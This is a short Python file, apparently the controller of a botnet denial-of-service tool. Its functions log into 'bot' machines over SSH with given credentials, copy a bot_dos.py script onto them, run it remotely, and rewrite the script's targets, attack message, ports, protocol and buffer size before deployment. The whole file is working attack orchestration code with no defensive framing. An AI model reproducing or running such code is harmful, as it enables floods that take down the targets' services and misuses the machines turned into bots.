from paramiko import SSHClient
from scp import SCPClient
import paramiko

def generate_dos(bot, username, password, script):
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # ssh.load_system_host_keys()
        
        ssh.connect(hostname=bot, username=username, password=password)
        stdin, stdout, stderr = ssh.exec_command("python {}".format(script))

        return("break")

def transfer_script(bot, username, password, script):
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=bot,username=username,password=password)
    
    if not username == "root":
        loc = "/home/{}/{}".format(username, script)
    else:
        loc = "/root/{}".format(script)
    
    with SCPClient(ssh.get_transport()) as scp:
        scp.put(script, loc)

    return("break")

def create_bot_dos_script(targets, attack_message, ports, transmission, buffer_size):
    script = "bot_dos.py"
    with open(script, "r") as scriptRead:
        lines = scriptRead.readlines()

    for line in lines:
        idx = lines.index(line)
        lines[idx] = line.rstrip()
    
    target = "targets = "
    message = "attack_message = "
    port_nums = "ports = "
    protocol = "transmission = "
    buff_size = "buffer_size = "

    target_array_string = "[{}]".format(", ".join(targets))
    port_array_string = "[{}]".format(", ".join(ports))
    
    for line in lines[0:7]:
        if target in line:
            idx = lines.index(line)
            lines[idx] = target + "'{}'".format(target_array_string)

        if message in line:
            idx = lines.index(line)
            lines[idx] = message + '"{}"'.format(attack_message)

        if port_nums in line:
            idx = lines.index(line)
            lines[idx] = port_nums + port_array_string

        if protocol in line:
            idx = lines.index(line)
            lines[idx] = protocol + '"{}"'.format(transmission)

        if buff_size in line:
            idx = lines.index(line)
            lines[idx] = buff_size + str(buffer_size)

    with open(script, "w") as scriptWrite:
        for line in lines:
            scriptWrite.write(line + "\n")

    return(script)

# host = 192.168.3.131